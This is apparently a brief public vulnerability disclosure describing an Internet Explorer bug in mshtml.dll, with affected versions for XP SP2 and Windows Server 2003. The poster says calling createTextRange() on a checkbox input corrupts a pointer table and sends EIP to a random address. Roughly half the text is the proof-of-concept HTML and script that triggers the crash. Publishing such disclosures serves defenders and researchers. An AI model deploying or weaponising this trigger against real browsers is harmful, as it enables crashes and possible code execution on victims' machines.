Stelian Ene:

I can't find any info on this delicious IE bug, but it seems to be publicly known:

It will badly access a (virtual?) pointer table, making EIP to jump at a random
address. This has various effects on the system I've tested with, including
crashing. It works on these versions of mshtml.dll:
XP SP2: 6.0.2900.2802 - latest
WS2003: 6.0.3790.0
--&gt;

&lt;input type=&quot;checkbox&quot; id='c'&gt;
&lt;script&gt;
        r=document.getElementById(&quot;c&quot;);
        a=r.createTextRange();
&lt;/script&gt;
